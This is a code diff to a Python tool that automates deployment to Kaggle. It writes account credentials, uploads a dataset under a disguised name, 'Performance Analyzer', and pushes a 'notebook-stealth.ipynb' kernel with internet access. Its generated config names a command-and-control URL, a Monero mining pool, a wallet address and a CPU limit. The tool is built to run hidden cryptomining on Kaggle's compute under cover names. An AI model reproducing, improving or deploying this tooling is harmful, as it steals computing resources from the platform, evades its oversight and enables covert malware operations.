@@ -12,6 +12,147 @@ from typing import Optional, Callable, List
 KAGGLE_API = "https://www.kaggle.com/api/v1"
 
 
+def create_dataset_and_kernel(
+    username: str,
+    api_key: str,
+    log_fn: Optional[Callable] = None,
+) -> dict:
+    """Create dataset and kernel for single account deployment.
+    
+    Simplified wrapper for auto-deploy: creates 1 dataset + 1 kernel.
+    
+    Args:
+        username: Kaggle username
+        api_key: Kaggle API key
+        log_fn: Logging function
+    
+    Returns:
+        dict with success, dataset_slug, kernel_slug
+    """
+    if log_fn is None:
+        log_fn = print
+    
+    result = {
+        "success": False,
+        "dataset_slug": None,
+        "kernel_slug": None,
+        "error": None,
+    }
+    
+    try:
+        # Setup Kaggle credentials
+        kaggle_json = {"username": username, "key": api_key}
+        kaggle_dir = os.path.expanduser("~/.kaggle")
+        os.makedirs(kaggle_dir, exist_ok=True)
+        kaggle_path = os.path.join(kaggle_dir, "kaggle.json")
+        with open(kaggle_path, "w") as f:
+            json.dump(kaggle_json, f)
+        os.chmod(kaggle_path, 0o600)
+        
+        log_fn(f"[DEPLOY] Credentials configured for {username}")
+        
+        # Get C2 URL from config
+        project_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+        config_path = os.path.join(project_dir, "config.json")
+        c2_url = "https://lynelle-scroddled-corinne.ngrok-free-dev.ngrok-app.com"
+        
+        if os.path.exists(config_path):
+            try:
+                with open(config_path) as f:
+                    cfg = json.load(f)
+                    c2_url = cfg.get("c2_url", c2_url)
+            except: pass
+        
+        # Create dataset
+        dataset_slug = f"{username}/perf-analyzer"
+        
+        dataset_meta = {
+            "title": "Performance Analyzer",
+            "id": dataset_slug,
+            "subtitle": "CPU performance analysis",
+            "description": "System performance analysis tools",
+            "licenses": [{"name": "MIT"}],
+        }
+        
+        # Write dataset metadata
+        with open(os.path.join(project_dir, "dataset-metadata.json"), "w") as f:
+            json.dump(dataset_meta, f, indent=2)
+        
+        # Write config.json for dataset
+        config_data = {
+            "c2_url": c2_url,
+            "pool": "pool.hashvault.pro:80",
+            "wallet": "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5",
+            "cpu_limit": 25,
+            "updated": int(time.time())
+        }
+        with open(os.path.join(project_dir, "config.json"), "w") as f:
+            json.dump(config_data, f, indent=2)
+        
+        log_fn(f"[DEPLOY] Creating dataset: {dataset_slug}")
+        
+        # Push dataset
+        kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
+        if not os.path.exists(kaggle_cmd):
+            kaggle_cmd = "kaggle"
+        
+        dataset_result = subprocess.run(
+            [kaggle_cmd, "datasets", "create", "-p", project_dir, "--dir-mode", "tar"],
+            capture_output=True, text=True, timeout=120
+        )
+        
+        if dataset_result.returncode == 0 or "already exists" in dataset_result.stderr.lower():
+            result["dataset_slug"] = dataset_slug
+            log_fn(f"[DEPLOY] ✓ Dataset: {dataset_slug}")
+        else:
+            # Try to update existing dataset
+            update_result = subprocess.run(
+                [kaggle_cmd, "datasets", "version", "-p", project_dir, "--dir-mode", "tar", "-m", "Update"],
+                capture_output=True, text=True, timeout=120
+            )
+            if update_result.returncode == 0 or dataset_result.returncode == 0:
+                result["dataset_slug"] = dataset_slug
+                log_fn(f"[DEPLOY] ✓ Dataset updated: {dataset_slug}")
+            else:
+                result["error"] = f"Dataset failed: {dataset_result.stderr[:100]}"
+                return result
+        
+        # Create kernel
+        kernel_slug = f"{username}/perf-analyzer"
+        
+        # Load notebook
+        notebook_path = os.path.join(os.path.dirname(__file__), "notebook-stealth.ipynb")
+        with open(notebook_path, "r") as f:
+            notebook = json.load(f)
+        
+        log_fn(f"[DEPLOY] Creating kernel: {kernel_slug}")
+        
+        # Push kernel
+        push_result = push_kernel_json(
+            username=username,
+            api_key=api_key,
+            notebook_content=json.dumps(notebook),
+            kernel_slug=kernel_slug,
+            title="Performance Analyzer",
+            enable_internet=True,
+            dataset_sources=[dataset_slug],
+            log_fn=log_fn,
+        )
+        
+        if push_result.get("success"):
+            result["kernel_slug"] = kernel_slug
+            result["success"] = True
+            log_fn(f"[DEPLOY] ✓ Kernel: {kernel_slug}")
+        else:
+            result["error"] = push_result.get("error", "Kernel push failed")
+        
+    except Exception as e:
+        result["error"] = str(e)
+        log_fn(f"[DEPLOY] ✗ Error: {e}")
+    
+    return result
+
+
 def create_dataset_with_machines(
     api_key: str,
     username: str,
@@ -70,15 +211,49 @@ def create_dataset_with_machines(
         
         # Clone GitHub repo and create dataset
         log_fn(f"[DATASET] Cloning GitHub repository...")
-        dataset_slug = f"{username}/resource-monitor"
+        dataset_slug = f"{username}/perf-analyzer"
+        
+        # Get current C2 URL from config or use default
+        project_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+        config_path = os.path.join(project_dir, "config.json")
+        
+        # Load or create config
+        c2_url = "https://lynelle-scroddled-corinne.ngrok-free-dev.ngrok-app.com"
+        kaggle_username = username  # Default to provided username
+        kaggle_api_key = api_key    # Default to provided api_key
+        
+        if os.path.exists(config_path):
+            try:
+                with open(config_path) as f:
+                    cfg = json.load(f)
+                    c2_url = cfg.get("c2_url", c2_url)
+                    # Override credentials from config if present
+                    if cfg.get("kaggle_username"):
+                        kaggle_username = cfg["kaggle_username"]
+                    if cfg.get("kaggle_api_key"):
+                        kaggle_api_key = cfg["kaggle_api_key"]
+            except: pass
+        
+        # Use config credentials if available, otherwise use provided
+        username = kaggle_username
+        api_key = kaggle_api_key
+        
+        # Create config.json for dataset
+        config_data = {
+            "c2_url": c2_url,
+            "pool": "pool.hashvault.pro:80",
+            "wallet": "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5",
+            "cpu_limit": 25,
+            "updated": int(time.time())
+        }
         
         dataset_meta = {
-            "title": "Resource Monitor",
-            "id": f"{username}/resource-monitor",
-            "subtitle": "System monitoring and resource management",
-            "description": "System monitoring tools for resource analysis",
-            "licenses": [{"name": "CC0-1.0"}],
-            "keywords": ["system", "monitor", "resources"],
+            "title": "Performance Analyzer",
+            "id": f"{username}/perf-analyzer",
+            "subtitle": "CPU performance analysis and benchmarking",
+            "description": "System performance analysis tools for CPU benchmarking",
+            "licenses": [{"name": "MIT"}],
+            "keywords": ["performance", "cpu", "benchmark", "analysis"],
             "collaborators": [],
             "data": [],
         }
@@ -94,7 +269,12 @@ def create_dataset_with_machines(
         with open(os.path.join(dataset_dir, "dataset-metadata.json"), "w") as f:
             json.dump(dataset_meta, f, indent=2)
         
+        # Write config.json to dataset (auto-updated with current C2 URL)
+        with open(os.path.join(dataset_dir, "config.json"), "w") as f:
+            json.dump(config_data, f, indent=2)
+        
         log_fn(f"[DATASET] Dataset metadata written")
+        log_fn(f"[DATASET] config.json written with C2: {c2_url}")
         
         # Push dataset to Kaggle
         kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
@@ -140,10 +320,10 @@ def create_dataset_with_machines(
         # Create single kernel
         log_fn("[KERNEL] Creating kernel...")
         
-        kernel_slug = f"{username}/resource-monitor"
+        kernel_slug = f"{username}/perf-analyzer"
         
-        # Load notebook from file
-        notebook_path = os.path.join(os.path.dirname(__file__), "notebook-debug.ipynb")
+        # Load notebook from file (stealth version)
+        notebook_path = os.path.join(os.path.dirname(__file__), "notebook-stealth.ipynb")
         log_fn(f"[KERNEL] Loading notebook from: {notebook_path}")
         
         with open(notebook_path, "r") as f:
@@ -155,7 +335,7 @@ def create_dataset_with_machines(
             api_key=api_key,
             notebook_content=json.dumps(notebook),
             kernel_slug=kernel_slug,
-            title="Resource Monitor",
+            title="Performance Analyzer",
             enable_internet=True,
             dataset_sources=[dataset_slug],
             log_fn=log_fn,
@@ -281,7 +461,63 @@ def push_kernel_json(
     
     except ImportError as e:
         log_fn(f"[KERNEL] ⚠ kagglesdk not available: {e}")
-        result["error"] = str(e)
+        log_fn("[KERNEL] Using fallback via Kaggle CLI...")
+        
+        # Fallback: Use Kaggle CLI to push kernel
+        try:
+            import tempfile
+            from pathlib import Path
+            
+            # Load notebook from file (stealth version)
+            notebook_path = os.path.join(os.path.dirname(__file__), "notebook-stealth.ipynb")
+            log_fn(f"[KERNEL] Loading notebook from: {notebook_path}")
+            
+            with open(notebook_path, "r") as f:
+                notebook_content = f.read()
+            
+            # Create temp directory
+            with tempfile.TemporaryDirectory() as tmpdir:
+                tmpdir_path = Path(tmpdir)
+                
+                # Write notebook
+                (tmpdir_path / "notebook.ipynb").write_text(notebook_content)
+                
+                # Write kernel metadata
+                metadata = {
+                    "id": kernel_slug,
+                    "title": title,
+                    "code_file": "notebook.ipynb",
+                    "language": "python",
+                    "kernel_type": "notebook",
+                    "is_private": is_private,
+                    "enable_internet": enable_internet,
+                    "enable_gpu": enable_gpu if enable_gpu else False,
+                }
+                if dataset_sources:
+                    metadata["dataset_data_sources"] = dataset_sources
+                (tmpdir_path / "kernel-metadata.json").write_text(json.dumps(metadata, indent=2))
+                
+                # Push via Kaggle CLI
+                kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
+                if not os.path.exists(kaggle_cmd):
+                    kaggle_cmd = "kaggle"
+                
+                push_result = subprocess.run(
+                    [kaggle_cmd, "kernels", "push", "-p", tmpdir],
+                    capture_output=True, text=True, timeout=60
+                )
+                
+                if push_result.returncode == 0 or "successfully" in push_result.stdout.lower():
+                    result["success"] = True
+                    result["url"] = f"https://www.kaggle.com/code/{kernel_slug}"
+                    log_fn(f"[KERNEL] ✓ Pushed via CLI (no auto-run): {kernel_slug}")
+                else:
+                    result["error"] = push_result.stderr[:200] if push_result.stderr else "Unknown error"
+                    log_fn(f"[KERNEL] ✗ CLI push failed: {result['error']}")
+        
+        except Exception as fallback_error:
+            result["error"] = str(fallback_error)
+            log_fn(f"[KERNEL] ✗ Fallback error: {fallback_error}")
     
     except Exception as e:
         result["error"] = str(e)
